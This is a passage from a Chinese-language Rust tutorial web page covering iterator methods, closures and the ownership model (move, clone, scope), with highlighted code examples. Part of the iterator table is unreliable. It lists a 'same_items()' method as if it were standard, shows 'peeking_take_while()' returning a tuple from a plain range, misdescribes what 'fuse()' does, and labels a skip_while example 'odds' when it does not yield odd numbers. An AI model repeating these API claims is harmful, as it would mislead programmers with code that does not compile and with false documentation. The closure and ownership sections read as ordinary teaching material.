<td>跳过迭代器中满足某个条件的元素，直到不满足为止。</td>
<td><code>let odds: Vec&lt;i32&gt; = (1..10).into_iter().skip_while(|x| x % 2 == 0).collect();</code></td>
</tr>
<tr>
<td><code>for_each()</code></td>
<td>对迭代器中的每个元素执行某种操作。</td>
<td><code>let mut counter = 0; (1..5).into_iter().for_each(|x| counter += x);</code></td>
</tr>
<tr>
<td><code>fold()</code></td>
<td>对迭代器中的元素进行折叠，使用一个累加器。</td>
<td><code>let sum: i32 = (1..5).into_iter().fold(0, |acc, x| acc + x);</code></td>
</tr>
<tr>
<td><code>try_fold()</code></td>
<td>对迭代器中的元素进行折叠，可能在遇到错误时提前返回。</td>
<td><code>let result: Result&lt;i32, &amp;str&gt; = (1..5).into_iter().try_fold(0, |acc, x| if x == 3 { Err("Found the number 3") } else { Ok(acc + x) });</code></td>
</tr>
<tr>
<td><code>scan()</code></td>
<td>对迭代器中的元素进行状态化的折叠。</td>
<td><code>let sum: Vec&lt;i32&gt; = (1..5).into_iter().scan(0, |acc, x| { *acc += x; Some(*acc) }).collect();</code></td>
</tr>
<tr>
<td><code>take()</code></td>
<td>从迭代器中取出最多 n 个元素。</td>
<td><code>let first_five = (1..10).into_iter().take(5).collect::&lt;Vec&lt;_&gt;&gt;();</code></td>
</tr>
<tr>
<td><code>skip()</code></td>
<td>跳过迭代器中的前 n 个元素。</td>
<td><code>let after_five = (1..10).into_iter().skip(5).collect::&lt;Vec&lt;_&gt;&gt;();</code></td>
</tr>
<tr>
<td><code>zip()</code></td>
<td>将两个迭代器中的元素打包成元组。</td>
<td><code>let zipped = (1..3).zip(&amp;['a', 'b', 'c']).collect::&lt;Vec&lt;_&gt;&gt;();</code></td>
</tr>
<tr>
<td><code>cycle()</code></td>
<td>重复迭代器中的元素，直至停止。</td>
<td><code>let repeated = (1..3).into_iter().cycle().take(7).collect::&lt;Vec&lt;_&gt;&gt;();</code></td>
</tr>
<tr>
<td><code>chain()</code></td>
<td>连接多个迭代器。</td>
<td><code>let combined = (1..3).chain(4..6).collect::&lt;Vec&lt;_&gt;&gt;();</code></td>
</tr>
<tr>
<td><code>rev()</code></td>
<td>反转迭代器中的元素顺序。</td>
<td><code>let reversed = (1..4).into_iter().rev().collect::&lt;Vec&lt;_&gt;&gt;();</code></td>
</tr>
<tr>
<td><code>enumerate()</code></td>
<td>为迭代器中的每个元素添加索引。</td>
<td><code>let enumerated = (1..4).into_iter().enumerate().collect::&lt;Vec&lt;_&gt;&gt;();</code></td>
</tr>
<tr>
<td><code>peeking_take_while()</code></td>
<td>取出满足条件的元素，同时保留迭代器的状态，可以继续取出后续元素。</td>
<td><code>let (first, rest) = (1..10).into_iter().peeking_take_while(|&amp;x| x &lt; 5);</code></td>
</tr>
<tr>
<td><code>step_by()</code></td>
<td>按照指定的步长返回迭代器中的元素。</td>
<td><code>let even_numbers = (0..10).into_iter().step_by(2).collect::&lt;Vec&lt;_&gt;&gt;();</code></td>
</tr>
<tr>
<td><code>fuse()</code></td>
<td>创建一个额外的迭代器，它在迭代结束后仍然可以调用 <code>next()</code> 方法。</td>
<td><code>let mut iter = (1..5).into_iter().fuse(); while iter.next().is_some() {}</code></td>
</tr>
<tr>
<td><code>inspect()</code></td>
<td>在取出每个元素时执行一个闭包，但不改变元素。</td>
<td><code>let mut counter = 0; (1..5).into_iter().inspect(|x| println!("Inspecting: {}", x)).for_each(|x| println!("Processing: {}", x));</code></td>
</tr>
<tr>
<td><code>same_items()</code></td>
<td>比较两个迭代器是否产生相同的元素序列。</td>
<td><code>let equal = (1..5).into_iter().same_items((1..5).into_iter());</code></td>
</tr>
</tbody>
</table>
<h2 id="note-cs-rust-rust-_21">闭包<a class="headerlink" href="#note-cs-rust-rust-_21" title="Permanent link">&para;</a></h2>
<p>Rust 中的闭包是一种匿名函数，它们可以捕获并存储其环境中的变量。</p>
<p>闭包允许在其定义的作用域之外访问变量，并且可以在需要时将其移动或借用给闭包。</p>
<p>闭包在 Rust 中被广泛应用于函数式编程、并发编程和事件驱动编程等领域。</p>
<p>闭包在 Rust 中非常有用，因为它们提供了一种简洁的方式来编写和使用函数。</p>
<p>以下是 Rust 闭包的一些关键特性和用法：</p>
<h3 id="note-cs-rust-rust-_22">闭包的声明<a class="headerlink" href="#note-cs-rust-rust-_22" title="Permanent link">&para;</a></h3>
<p>闭包的语法声明
<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#note-cs-rust-rust-__codelineno-35-1"></a>|参数···|&lt;表达式&gt;
</span></code></pre></div></p>
<p>其中参数可以有类型注解,也可以省略,RUST编译器会根据上下文推断它们
<div class="language-rust highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#note-cs-rust-rust-__codelineno-36-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">add_one</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">|</span><span class="n">x</span>:<span class="kt">i32</span><span class="o">|</span><span class="w"> </span><span class="n">x</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
</span></code></pre></div>
闭包可以有0个或者多个参数,并且可以返回一个值,可以像函数一样被调用</p>
<p><div class="language-rust highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#note-cs-rust-rust-__codelineno-37-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">calculate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">|</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="o">|</span><span class="w"> </span><span class="n">a</span><span class="o">*</span><span class="n">c</span><span class="o">+</span><span class="n">b</span><span class="p">;</span>
</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#note-cs-rust-rust-__codelineno-37-2"></a><span class="kd">let</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">calculate</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span>
</span></code></pre></div>
闭包有点像python中的<code>lambda</code>语句，闭包在 Rust 中类似于匿名函数，可以在代码中以 {} 语法块的形式定义，使用 || 符号来表示参数列表</p>
<h3 id="note-cs-rust-rust-_23">捕获外部变量<a class="headerlink" href="#note-cs-rust-rust-_23" title="Permanent link">&para;</a></h3>
<p>闭包可以捕获周围环境中的变量，这意味着它可以访问定义闭包时所在作用域中的变量。</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#note-cs-rust-rust-__codelineno-38-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">5</span><span class="p">;</span>
</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#note-cs-rust-rust-__codelineno-38-2"></a><span class="kd">let</span><span class="w"> </span><span class="n">square</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">|</span><span class="n">num</span><span class="o">|</span><span class="w"> </span><span class="n">num</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">x</span><span class="p">;</span>
</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#note-cs-rust-rust-__codelineno-38-3"></a><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">square</span><span class="p">(</span><span class="mi">3</span><span class="p">));</span><span class="w"> </span><span class="c1">// 输出: 15</span>
</span></code></pre></div>
</div>
<div class="admonition 移动与借用">
<p class="admonition-title">移动与借用</p>
<p>闭包可以通过 <code>move</code> 关键字获取外部变量的所有权，或者通过借用的方式获取外部变量的引用。例如：
<div class="language-rust highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#note-cs-rust-rust-__codelineno-39-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">10</span><span class="p">;</span>
</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#note-cs-rust-rust-__codelineno-39-2"></a><span class="kd">let</span><span class="w"> </span><span class="n">add_x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">|</span><span class="n">y</span><span class="o">|</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">y</span><span class="p">;</span>
</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#note-cs-rust-rust-__codelineno-39-3"></a><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">add_x</span><span class="p">(</span><span class="mi">5</span><span class="p">));</span><span class="w"> </span><span class="c1">// 输出 15</span>
</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#note-cs-rust-rust-__codelineno-39-4"></a><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">x</span><span class="p">);</span><span class="w"> </span><span class="c1">// 仍然可以使用 x</span>
</span></code></pre></div>
通过在闭包前添加 <code>move</code> 关键字，闭包会获取它捕获的环境变量的所有权。这意味着这些变量的所有权会从外部作用域转移到闭包内部，外部作用域将无法再使用这些变量。例如：
<div class="language-rust highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#note-cs-rust-rust-__codelineno-40-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;hello&quot;</span><span class="p">);</span>
</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#note-cs-rust-rust-__codelineno-40-2"></a><span class="kd">let</span><span class="w"> </span><span class="n">print_s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">move</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">s</span><span class="p">);</span>
</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#note-cs-rust-rust-__codelineno-40-3"></a><span class="n">print_s</span><span class="p">();</span><span class="w"> </span><span class="c1">// 输出 &quot;hello&quot;</span>
</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#note-cs-rust-rust-__codelineno-40-4"></a><span class="c1">// println!(&quot;{}&quot;, s); // 这行代码将会报错，因为 s 的所有权已经被转移给了闭包</span>
</span></code></pre></div>
<code>String::from("hello")</code>: 这是一个调用 <code>String</code> 类型的关联函数 <code>from</code>，用于将一个字面量字符串<code>（"hello"）</code>转换为一个 <code>String</code> 类型。</p>
<p><code>String</code> 类型:</p>
<p>在 Rust 中，字符串有两种主要的表示形式：<code>&amp;str</code> 和 <code>String</code>。
<code>&amp;str</code> 是一种切片，通常表示在编译时已知长度的不可变字符串。
<code>String</code> 是一种堆分配的可变字符串，适用于在运行时可能需要修改或扩展的字符串。</p>
<p><code>String::from:</code></p>
<p><code>String::from</code> 是 <code>String</code> 类型的一个关联函数，它用于从 <code>&amp;str</code> 类型创建一个 <code>String</code> 类型的值。
在这个例子中，<code>String::from("hello")</code>创建了一个新的 <code>String</code>，其中包含了字符串 <code>"hello"</code> 的内容。</p>
<p>分配和所有权:</p>
<p><code>String::from("hello")</code> 创建的 <code>String</code> 对象在堆上分配了内存，并且拥有该内存的所有权。
变量 <code>s</code> 获得了这个 <code>String</code> 的所有权，这意味着当 s 作用域结束时，Rust 会自动释放 <code>s</code> 所占用的内存。</p>
</div>
<h3 id="note-cs-rust-rust-_24">迭代器中的闭包<a class="headerlink" href="#note-cs-rust-rust-_24" title="Permanent link">&para;</a></h3>
<p>闭包在rust中经常与迭代器一起使用，用于对集合中的元素进行处理</p>
<p>例如之前提过的<code>map</code>方法</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#note-cs-rust-rust-__codelineno-41-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">vec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="fm">vec!</span><span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">];</span>
</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#note-cs-rust-rust-__codelineno-41-2"></a><span class="kd">let</span><span class="w"> </span><span class="n">squared_vec</span>: <span class="nb">Vec</span><span class="o">&lt;</span><span class="kt">i32</span><span class="o">&gt;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">vec</span><span class="p">.</span><span class="n">iter</span><span class="p">().</span><span class="n">map</span><span class="p">(</span><span class="o">|</span><span class="n">x</span><span class="o">|</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">x</span><span class="p">).</span><span class="n">collect</span><span class="p">();</span>
</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#note-cs-rust-rust-__codelineno-41-3"></a><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{:?}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">squared_vec</span><span class="p">);</span><span class="w"> </span><span class="c1">// 输出: [1, 4, 9]</span>
</span></code></pre></div>
<p>在这个例子中，闭包<code>|x| x*x</code>被传递给<code>map()</code>对集合中的每一个元素进行平方操作</p>
<p><strong>闭包作为参数和返回值</strong></p>
<p>闭包可以作为参数传递给函数，也可以作为函数的返回值。</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#note-cs-rust-rust-__codelineno-42-1"></a><span class="c1">// 定义一个函数，接受一个闭包作为参数，将闭包应用到给定的数字上</span>
</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#note-cs-rust-rust-__codelineno-42-2"></a><span class="k">fn</span> <span class="nf">apply_operation</span><span class="o">&lt;</span><span class="n">F</span><span class="o">&gt;</span><span class="p">(</span><span class="n">num</span>: <span class="kt">i32</span><span class="p">,</span><span class="w"> </span><span class="n">operation</span>: <span class="nc">F</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="kt">i32</span>
</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#note-cs-rust-rust-__codelineno-42-3"></a><span class="nc">where</span>
</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#note-cs-rust-rust-__codelineno-42-4"></a><span class="w">  </span><span class="n">F</span>: <span class="nb">Fn</span><span class="p">(</span><span class="kt">i32</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="kt">i32</span><span class="p">,</span>
</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5" href="#note-cs-rust-rust-__codelineno-42-5"></a><span class="p">{</span>
</span><span id="__span-42-6"><a id="__codelineno-42-6" name="__codelineno-42-6" href="#note-cs-rust-rust-__codelineno-42-6"></a><span class="w">  </span><span class="n">operation</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
</span><span id="__span-42-7"><a id="__codelineno-42-7" name="__codelineno-42-7" href="#note-cs-rust-rust-__codelineno-42-7"></a><span class="p">}</span>
</span><span id="__span-42-8"><a id="__codelineno-42-8" name="__codelineno-42-8" href="#note-cs-rust-rust-__codelineno-42-8"></a>
</span><span id="__span-42-9"><a id="__codelineno-42-9" name="__codelineno-42-9" href="#note-cs-rust-rust-__codelineno-42-9"></a><span class="c1">// 主函数</span>
</span><span id="__span-42-10"><a id="__codelineno-42-10" name="__codelineno-42-10" href="#note-cs-rust-rust-__codelineno-42-10"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-42-11"><a id="__codelineno-42-11" name="__codelineno-42-11" href="#note-cs-rust-rust-__codelineno-42-11"></a><span class="w">  </span><span class="c1">// 定义一个数字</span>
</span><span id="__span-42-12"><a id="__codelineno-42-12" name="__codelineno-42-12" href="#note-cs-rust-rust-__codelineno-42-12"></a><span class="w">  </span><span class="kd">let</span><span class="w"> </span><span class="n">num</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">5</span><span class="p">;</span>
</span><span id="__span-42-13"><a id="__codelineno-42-13" name="__codelineno-42-13" href="#note-cs-rust-rust-__codelineno-42-13"></a>
</span><span id="__span-42-14"><a id="__codelineno-42-14" name="__codelineno-42-14" href="#note-cs-rust-rust-__codelineno-42-14"></a><span class="w">  </span><span class="c1">// 定义一个闭包，用于对数字进行平方运算</span>
</span><span id="__span-42-15"><a id="__codelineno-42-15" name="__codelineno-42-15" href="#note-cs-rust-rust-__codelineno-42-15"></a><span class="w">  </span><span class="kd">let</span><span class="w"> </span><span class="n">square</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">|</span><span class="n">x</span><span class="o">|</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">x</span><span class="p">;</span>
</span><span id="__span-42-16"><a id="__codelineno-42-16" name="__codelineno-42-16" href="#note-cs-rust-rust-__codelineno-42-16"></a>
</span><span id="__span-42-17"><a id="__codelineno-42-17" name="__codelineno-42-17" href="#note-cs-rust-rust-__codelineno-42-17"></a><span class="w">  </span><span class="c1">// 调用函数，并传入闭包作为参数，对数字进行平方运算</span>
</span><span id="__span-42-18"><a id="__codelineno-42-18" name="__codelineno-42-18" href="#note-cs-rust-rust-__codelineno-42-18"></a><span class="w">  </span><span class="kd">let</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">apply_operation</span><span class="p">(</span><span class="n">num</span><span class="p">,</span><span class="w"> </span><span class="n">square</span><span class="p">);</span>
</span><span id="__span-42-19"><a id="__codelineno-42-19" name="__codelineno-42-19" href="#note-cs-rust-rust-__codelineno-42-19"></a>
</span><span id="__span-42-20"><a id="__codelineno-42-20" name="__codelineno-42-20" href="#note-cs-rust-rust-__codelineno-42-20"></a><span class="w">  </span><span class="c1">// 输出结果</span>
</span><span id="__span-42-21"><a id="__codelineno-42-21" name="__codelineno-42-21" href="#note-cs-rust-rust-__codelineno-42-21"></a><span class="w">  </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;Square of {} is {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">num</span><span class="p">,</span><span class="w"> </span><span class="n">result</span><span class="p">);</span>
</span><span id="__span-42-22"><a id="__codelineno-42-22" name="__codelineno-42-22" href="#note-cs-rust-rust-__codelineno-42-22"></a><span class="p">}</span>
</span></code></pre></div>
<div class="admonition info">
<p class="admonition-title">Info</p>
<p><code>apply_operation</code> 函数</p>
<p><code>fn apply_operation&lt;F&gt;(num: i32, operation: F) -&gt; i32</code>:</p>
<p>这是一个函数定义。</p>
<ul>
<li><code>apply_operation</code> 函数接受两个参数并返回一个 <code>i32</code> 类型的值。</li>
<li><code>num: i32</code>: 第一个参数 <code>num</code> 是一个 <code>i32</code> 类型的整数。</li>
<li><code>operation: F</code>: 第二个参数 <code>operation</code> 是一个泛型 <code>F</code>，它代表一个闭包（或函数）。</li>
<li><code>-&gt; i32</code>: 函数返回一个 <code>i32</code> 类型的值。</li>
</ul>
<p><code>where F: Fn(i32) -&gt; i32</code>:</p>
<p>这是一个约束，规定了泛型 <code>F</code>必须实现 <code>Fn(i32) -&gt; i32</code> 这个特性。换句话说，<code>F</code> 必须是一个接受一个 <code>i32</code> 参数并返回一个 <code>i32</code> 值的闭包或函数。</p>
<p><code>operation(num)</code>:</p>
<p>这行代码调用了传入的闭包 <code>operation</code>，并将 <code>num</code> 作为参数传递给它。闭包的执行结果将作为 <code>apply_operation</code> 函数的返回值。</p>
<p><code>let result = apply_operation(num, square);</code>:</p>
<p>这行代码调用 <code>apply_operation</code> 函数，将 <code>num</code> 和 <code>square</code> 闭包作为参数传入。
<code>apply_operation</code> 函数执行 <code>square(num)</code>，即计算 5 的平方，并将结果返回给 <code>result</code> 变量。</p>
<p>最后程序会输出Square of 5 is 25</p>
</div>
<h2 id="note-cs-rust-rust-rust_1">RUST所有权<a class="headerlink" href="#note-cs-rust-rust-rust_1" title="Permanent link">&para;</a></h2>
<div class="admonition abstract">
<p class="admonition-title">Abstract</p>
<p>计算机程序必须在运行时管理它们所使用的内存资源。</p>
<p>大多数的编程语言都有管理内存的功能：</p>
<p>C/C++ 这样的语言主要通过手动方式管理内存，开发者需要手动的申请和释放内存资源。但为了提高开发效率，只要不影响程序功能的实现，许多开发者没有及时释放内存的习惯。所以手动管理内存的方式常常造成资源浪费。</p>
<p>Java 语言编写的程序在虚拟机（JVM）中运行，JVM 具备自动回收内存资源的功能。但这种方式常常会降低运行时效率，所以 JVM 会尽可能少的回收资源，这样也会使程序占用较大的内存资源。</p>
<p>所有权对大多数开发者而言是一个新颖的概念，它是 Rust 语言为高效使用内存而设计的语法机制。所有权概念是为了让 Rust 在编译阶段更有效地分析内存资源的有用性以实现内存管理而诞生的概念。</p>
</div>
<p><strong>所有权规则</strong></p>
<ul>
<li>Rust 中的每个值都有一个变量，称为其所有者。</li>
<li>一次只能有一个所有者。</li>
<li>当所有者不在程序运行范围时，该值将被删除。 </li>
</ul>
<div class="admonition 变量范围">
<p class="admonition-title">变量范围</p>
<p>变量范围是变量的一个属性，其代表变量的可行域，默认从声明变量开始有效直到变量所在域结束。
<div class="language-rust highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#note-cs-rust-rust-__codelineno-43-1"></a><span class="p">{</span>
</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#note-cs-rust-rust-__codelineno-43-2"></a><span class="c1">// 在声明以前，变量 s 无效</span>
</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#note-cs-rust-rust-__codelineno-43-3"></a><span class="kd">let</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;runoob&quot;</span><span class="p">;</span>
</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#note-cs-rust-rust-__codelineno-43-4"></a><span class="c1">// 这里是变量 s 的可用范围</span>
</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5" href="#note-cs-rust-rust-__codelineno-43-5"></a><span class="p">}</span>
</span><span id="__span-43-6"><a id="__codelineno-43-6" name="__codelineno-43-6" href="#note-cs-rust-rust-__codelineno-43-6"></a><span class="c1">// 变量范围已经结束，变量 s 无效</span>
</span></code></pre></div></p>
</div>
<h3 id="note-cs-rust-rust-_25">内存和分配<a class="headerlink" href="#note-cs-rust-rust-_25" title="Permanent link">&para;</a></h3>
<p>如果我们定义了一个变量并给它赋予一个值，这个变量的值存在于内存中。这种情况很普遍。但如果我们需要储存的数据长度不确定（比如用户输入的一串字符串），我们就无法在定义时明确数据长度，也就无法在编译阶段令程序分配固定长度的内存空间供数据储存使用。（有人说分配尽可能大的空间可以解决问题，但这个方法很不文明）。这就需要提供一种在程序运行时程序自己申请使用内存的机制————堆。</p>
<p>有分配就有释放，程序不能一直占用某个内存资源。因此决定资源是否浪费的关键因素就是资源有没有及时的释放。</p>
<p>例如在C语言中
<div class="language-C highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#note-cs-rust-rust-__codelineno-44-1"></a><span class="w">   </span><span class="kt">char</span><span class="o">*</span><span class="n">s</span><span class="o">=</span><span class="s">&quot;abcd&quot;</span>
</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#note-cs-rust-rust-__codelineno-44-2"></a><span class="w">   </span><span class="n">free</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span></code></pre></div></p>
<p>很显然，Rust 中没有调用 <code>free</code> 函数来释放字符串 <code>s</code> 的资源（我们知道这样在 C 语言中是不正确的写法，因为 <code>"abcd"</code> 不在堆中，这里假设它在）。Rust 之所以没有明示释放的步骤是因为在变量范围结束的时候，Rust 编译器自动添加了调用释放资源函数的步骤。</p>
<p>这种机制看似很简单了：它不过是帮助程序员在适当的地方添加了一个释放资源的函数调用而已。但这种简单的机制可以有效地解决一个史上最令程序员头疼的编程问题。</p>
<h3 id="note-cs-rust-rust-_26">变量与数据交互的方式<a class="headerlink" href="#note-cs-rust-rust-_26" title="Permanent link">&para;</a></h3>
<p>变量与数据交互的方式有两种:移动（move）和克隆（clone）两种</p>
<p><strong>移动</strong>：</p>
<p>多个变量可以在rust中以不同的方式与相同的数据交互
<div class="language-rust highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#note-cs-rust-rust-__codelineno-45-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">5</span><span class="p">;</span>
</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#note-cs-rust-rust-__codelineno-45-2"></a><span class="kd">let</span><span class="w"> </span><span class="n">y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">x</span><span class="p">;</span>
</span></code></pre></div>
这个程序将值 5 绑定到变量 x，然后将 x 的值复制并赋值给变量 y。现在栈中将有两个值 5。此情况中的数据是"基本数据"类型的数据，不需要存储到堆中，仅在栈中的数据的"移动"方式是直接复制，这不会花费更长的时间或更多的存储空间。"基本数据"类型有这些：</p>
<ul>
<li>所有整数类型，例如 i32 、 u32 、 i64 等。</li>
<li>布尔类型 bool，值为 true 或 false 。</li>
<li>所有浮点类型，f32 和 f64。</li>
<li>字符类型 char。</li>
<li>仅包含以上类型数据的元组（Tuples） </li>
</ul>
<p>但如果发生交互的数据在堆中就是另外一种情况</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#note-cs-rust-rust-__codelineno-46-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">s1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;hello&quot;</span><span class="p">);</span>
</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#note-cs-rust-rust-__codelineno-46-2"></a><span class="kd">let</span><span class="w"> </span><span class="n">s2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s1</span><span class="p">;</span>
</span></code></pre></div>
<p>第一步产生一个 String 对象，值为 "hello"。其中 "hello" 可以认为是类似于长度不确定的数据，需要在堆中存储。</p>
<p>第二步：两个 String 对象在栈中，每个 String 对象都有一个指针指向堆中的 "hello" 字符串。在给 s2 赋值时，只有栈中的数据被复制了，堆中的字符串依然还是原来的字符串。</p>
<p>前面我们说过，当变量超出范围时，Rust 自动调用释放资源函数并清理该变量的堆内存。但是 s1 和 s2 都被释放的话堆区中的 "hello" 被释放两次，这是不被系统允许的。为了确保安全，在给 s2 赋值时 s1 已经无效了。没错，在把 s1 的值赋给 s2 以后 s1 将不可以再被使用。</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#note-cs-rust-rust-__codelineno-47-1"></a><span class="w">  </span><span class="kd">let</span><span class="w"> </span><span class="n">s1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;hello&quot;</span><span class="p">);</span>
</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#note-cs-rust-rust-__codelineno-47-2"></a><span class="w">  </span><span class="kd">let</span><span class="w"> </span><span class="n">s2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s1</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#note-cs-rust-rust-__codelineno-47-3"></a><span class="w">  </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}, world!&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">s1</span><span class="p">);</span><span class="w"> </span><span class="c1">// 错误！s1 已经失效</span>
</span></code></pre></div>
<p>这段程序是错的，在给<code>s2</code>赋值之后，<code>s1</code>已经名存实亡了</p>
<p><strong>克隆</strong></p>
<p>Rust会尽可能地降低程序的运行成本，所以默认情况下，长度较大的数据存放在堆中，且采用移动的方式进行数据交互。但如果需要将数据单纯的复制一份以供他用，可以使用数据的第二种交互方式——克隆。</p>
<p>实例
<div class="language-rust highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#note-cs-rust-rust-__codelineno-48-1"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#note-cs-rust-rust-__codelineno-48-2"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">s1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;hello&quot;</span><span class="p">);</span>
